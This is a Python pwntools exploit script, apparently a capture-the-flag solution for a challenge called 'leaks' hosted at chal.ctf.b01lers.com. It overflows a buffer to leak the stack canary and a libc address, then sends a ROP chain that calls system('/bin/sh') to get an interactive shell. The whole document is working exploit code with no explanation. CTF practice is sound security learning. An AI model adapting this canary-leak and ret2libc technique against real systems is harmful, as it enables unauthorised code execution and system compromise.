from pwn import *
import time
elf = ELF("./leaks-c85e4a348b2a07ba8e6484d69956d968")
libc = ELF("./leaks-libc")
ld = ELF("./ld-2.31.so")
context.binary=elf
#target=process([elf.path],env={"LD_PRELOAD":libc.path})
target=remote('chal.ctf.b01lers.com',1009)
context.log_level='DEBUG'

def sla(string,val):
	target.sendlineafter(string,val)

def sa(string,val):
	target.sendafter(string,val)

def attack(size,payload):
	target.sendline(str(size))
	time.sleep(0.1)
	target.send(payload)	
	time.sleep(0.1)

target.recvline()
attack(0x10,"A"*0x11)
attack(0x18,"A"*0x19)
target.recvuntil("A"*0x18)
canary=u64(target.recv(8))-0x41
print(hex(canary))
attack(0x27,"A"*0x28)
target.recvuntil("A"*0x28)
libc_base=u64(target.recv(6).ljust(8,"\x00"))-0x270b3
print(hex(libc_base))
gadget=0xe6e79
libc_gadget=libc_base+gadget
libc_system=libc_base+libc.symbols["system"]
libc_binsh=libc_base+libc.search("/bin/sh\x00").next()
poprsi=0x0000000000027529+libc_base
poprdi=0x0000000000026b72+libc_base
ret=0x0000000000025679+libc_base
payload="A"*0x18+p64(canary)+"A"*8+p64(poprdi)+p64(libc_binsh)+p64(ret)+p64(libc_system)
#pause()
attack(len(payload)-1,payload)
target.interactive()
